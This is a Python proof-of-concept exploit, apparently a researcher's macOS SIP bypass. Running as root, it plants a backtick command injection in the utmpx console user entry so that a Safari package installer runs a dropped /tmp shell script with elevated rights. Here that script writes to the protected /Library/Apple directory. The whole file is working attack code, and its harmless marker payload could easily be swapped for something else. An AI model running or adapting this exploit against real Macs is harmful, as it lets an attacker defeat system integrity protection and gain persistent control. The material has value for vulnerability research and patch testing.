#!/usr/bin/env python3
import subprocess
import tempfile
import os
import shutil
import time
import base64
import ctypes
import ctypes.util
import time

# Base path
BASE_PATH = os.path.realpath(os.path.dirname(__file__))

# Package path
PKG_PATH = os.path.join(BASE_PATH, 'Safari26.3.1SequoiaAuto.pkg')

# Payload-related
PAYLOAD_PATH = '/tmp/a.sh'
PAYLOAD_CONTENT = '#!/bin/bash\necho utmpwn by JBO > /Library/Apple/utmpwn\n'
PAYLOAD_CMD_INJ = f'`{PAYLOAD_PATH}`'

# Constants that are utmpx-related
UTMPX_PATH = '/var/run/utmpx'
USER_PROCESS = 7

# Pretty-printing
PP_LEN = 120
RESET = '\033[0m'
GREEN = '\033[1;32m'
GREY = '\033[1;30m'
RED = '\033[1;31m'
WHITE = '\033[1;37m'
LOGO = base64.b64decode(b'CiAgICDilojilojilZcgICDilojilojilZfilojilojilojilojilojilojilojilojilZfilojilojilojilZcgICDilojilojilojilZfilojilojilojilojilojilojilZcg4paI4paI4pWXICAgIOKWiOKWiOKVl+KWiOKWiOKWiOKVlyAgIOKWiOKWiOKVlwogICAg4paI4paI4pWRICAg4paI4paI4pWR4pWa4pWQ4pWQ4paI4paI4pWU4pWQ4pWQ4pWd4paI4paI4paI4paI4pWXIOKWiOKWiOKWiOKWiOKVkeKWiOKWiOKVlOKVkOKVkOKWiOKWiOKVl+KWiOKWiOKVkSAgICDilojilojilZHilojilojilojilojilZcgIOKWiOKWiOKVkQogICAg4paI4paI4pWRICAg4paI4paI4pWRICAg4paI4paI4pWRICAg4paI4paI4pWU4paI4paI4paI4paI4pWU4paI4paI4pWR4paI4paI4paI4paI4paI4paI4pWU4pWd4paI4paI4pWRIOKWiOKVlyDilojilojilZHilojilojilZTilojilojilZcg4paI4paI4pWRCiAgICDilojilojilZEgICDilojilojilZEgICDilojilojilZEgICDilojilojilZHilZrilojilojilZTilZ3ilojilojilZHilojilojilZTilZDilZDilZDilZ0g4paI4paI4pWR4paI4paI4paI4pWX4paI4paI4pWR4paI4paI4pWR4pWa4paI4paI4pWX4paI4paI4pWRCiAgICDilZrilojilojilojilojilojilojilZTilZ0gICDilojilojilZEgICDilojilojilZEg4pWa4pWQ4pWdIOKWiOKWiOKVkeKWiOKWiOKVkSAgICAg4pWa4paI4paI4paI4pWU4paI4paI4paI4pWU4pWd4paI4paI4pWRIOKVmuKWiOKWiOKWiOKWiOKVkQogICAgIOKVmuKVkOKVkOKVkOKVkOKVkOKVnSAgICDilZrilZDilZ0gICDilZrilZDilZ0gICAgIOKVmuKVkOKVneKVmuKVkOKVnSAgICAgIOKVmuKVkOKVkOKVneKVmuKVkOKVkOKVnSDilZrilZDilZ0gIOKVmuKVkOKVkOKVkOKVnQogICAgWWV0IGFub3RoZXIgU0lQIGJ5cGFzcyBieSBKb25hdGhhbiBCYXIgT3IgKEB5b195b195b19qYm8pCgo=').decode()

# Structure - Timeval
class Timeval(ctypes.Structure):
    _fields_ = [
        ('tv_sec', ctypes.c_long),
        ('tv_usec', ctypes.c_int),
    ]

# Structure - Utmpx
class Utmpx(ctypes.Structure):
    _fields_ = [
        ('ut_user', ctypes.c_char * 256),
        ('ut_id', ctypes.c_char * 4),
        ('ut_line', ctypes.c_char * 32),
        ('ut_pid', ctypes.c_int32),
        ('ut_type', ctypes.c_short),
        ('ut_tv', Timeval),
        ('ut_host', ctypes.c_char * 256),
        ('ut_pad', ctypes.c_uint32 * 16),
    ]

# Get libc
libc = ctypes.CDLL(ctypes.util.find_library('c'), use_errno=True)

# Prototype - libc!setutxent
libc.setutxent.argtypes = []
libc.setutxent.restype = None

# Prototype - libc!getutxent
libc.getutxent.argtypes = []
libc.getutxent.restype = ctypes.POINTER(Utmpx)

# Prototype - libc!pututxline
libc.pututxline.argtypes = [ ctypes.POINTER(Utmpx) ]
libc.pututxline.restype = ctypes.POINTER(Utmpx)

# Stage state
g_in_stage = False
g_pending_msgs = []

def flush_pending_messages():
    """
        Attempts to flush pending messages.
    """

    # Dump if not in stag
    global g_pending_msgs
    if not g_in_stage:
        if len(g_pending_msgs) > 0:
            print(GREY + '\n'.join(g_pending_msgs) + RESET)
            g_pending_msgs = []

def add_debug_message(msg:str):
    """
        Adds a debug message.
    """

    # Add message and try to flush pending messages
    global g_pending_msgs
    g_pending_msgs.append(msg)
    flush_pending_messages()

def start_stage(msg:str):
    """
        Starts a stage.
    """

    # Mark in stage
    global g_in_stage
    assert not g_in_stage, Exception('Already in stage')
    g_in_stage = True

    # Pretty-print
    title = msg[:PP_LEN - 5]
    title += ' ...'
    title += '.' * (PP_LEN - len(title) - 1)
    title += ' '
    print(title, end='')

def end_stage(fail_msg:str=None):
    """
        Ends a stage.
    """

    # Mark not in stage
    global g_in_stage
    assert g_in_stage, Exception('Out of stage')
    g_in_stage = False

    # Pretty print
    if fail_msg is None:
        print(f'[  {GREEN}OK{RESET}  ]')
    else:
        print(f'[ {RED}FAIL{RESET} ]\n\nError: {fail_msg}')

    # Flush pending messages
    flush_pending_messages()

def patch_utmpx():
    """
        Patches the utmpx file for a command injection.
    """

    # Reset at first entry
    libc.setutxent()

    # Handle exceptions for cleanup
    try:

        # Iterate entries
        patched = False
        while True:

            # Get entry
            p_entry = libc.getutxent()
            if not p_entry:
                break
            entry = p_entry.contents

            # Find the console user
            if entry.ut_type == USER_PROCESS and entry.ut_line == b'console':

                # Add message
                add_debug_message(f'Found:   ut_user={entry.ut_user!r}  ut_line={entry.ut_line!r}  ut_pid={entry.ut_pid}')

                # Copy the live entry so ut_id is preserved (pututxline matches on ut_id)
                record = Utmpx()
                ctypes.memmove(ctypes.addressof(record), ctypes.addressof(entry), ctypes.sizeof(Utmpx))
                record.ut_user = PAYLOAD_CMD_INJ.encode('utf-8')
                record.ut_tv.tv_sec = int(time.time())
                record.ut_tv.tv_usec = 0

                # Commit
                result = libc.pututxline(ctypes.byref(record))
                assert result, Exception(f'Failed committing utmpx entry (errno={ctypes.get_errno()})')
                patched = True
                break

    # Clean-up
    finally:
    
        # Finish
        libc.endutxent()

    # Validate we patched something
    assert patched, Exception(f'No console entry found') 

def main():
    """
        Main routine.
    """

    # Catch everything
    utmpx_contents = None
    try:

        # Print logo
        print(f'{WHITE}{LOGO}{RESET}')

        # Validate we run as root
        start_stage('Validating root execution')
        assert os.geteuid() == 0, Exception('Must run as root')
        end_stage()

        # Validate package
        start_stage('Validating pkg file')
        assert os.path.isfile(PKG_PATH), Exception(f'Missing pkg file: {os.path.basename(PKG_PATH)}')
        end_stage()

        # Dropping payload
        start_stage('Dropping payload')
        with open(PAYLOAD_PATH, 'w') as fp:
            fp.write(PAYLOAD_CONTENT)
        os.chmod(PAYLOAD_PATH, 0o755)
        end_stage()

        # Backing up utmpx contents
        start_stage('Backing up utmpx contents')
        with open(UTMPX_PATH, 'rb') as fp:
            utmpx_contents = fp.read()
        end_stage()

        # Patching utmpx
        start_stage('Patching utmpx entry')
        patch_utmpx()
        end_stage()

        # Validating command injection
        start_stage('Validating utmpx patching')
        lines = subprocess.run([ '/usr/bin/who' ], capture_output=True, text=True).stdout.split('\n')
        assert len([ line for line in lines if ' console ' in line and PAYLOAD_CMD_INJ in line ]) > 0, Exception('Patching does not seem to affect the "who" binary output')
        end_stage()

        # Installing pkg
        start_stage('Installing pkg')
        subprocess.run([ '/usr/sbin/installer', '-pkg', PKG_PATH, '-target', '/' ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) 
        end_stage()

    # Handle exceptions
    except Exception as ex:
        if g_in_stage:
            end_stage(str(ex))

    # Clean-ups
    finally:

        # Restore utmpx contents
        if utmpx_contents is not None:
            try:
                with open(UTMPX_PATH, 'wb') as fp:
                    fp.write(utmpx_contents)
                add_debug_message('Restored utmpx file successfully')
            except Exception:
                add_debug_message('Could not restore utmpx file!')

if __name__ == '__main__':
    main()

